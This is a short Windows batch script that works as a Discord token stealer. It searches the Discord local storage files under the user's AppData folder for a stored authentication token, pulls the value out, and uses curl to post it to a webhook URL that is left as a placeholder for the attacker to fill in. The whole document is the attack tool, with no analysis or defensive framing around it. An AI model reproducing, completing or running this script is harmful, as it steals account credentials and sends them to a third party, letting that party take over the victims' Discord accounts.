@echo off
set "CacheFile=%APPDATA%\discord\Local Storage\leveldb\"
for %%F in ("%CacheFile%*") do (
    findstr /C:"oken" "%%F" > nul 2>&1
    if not errorlevel 1 (
        for /f "tokens=2 delims=:" %%T in ('findstr /C:"oken" "%%F"') do (
            set "Token=%%T"
            goto :SendToWebhook
        )
    )
)
echo Discord token not found.
pause
exit
:SendToWebhook
set "WebhookURL=YOUR_WEBHOOK_URL_HERE"
set "Content=Discord Token: %Token%"
curl -H "Content-Type: application/json" -d "{\"content\":\"%Content%\"}" %WebhookURL%
pause
exit
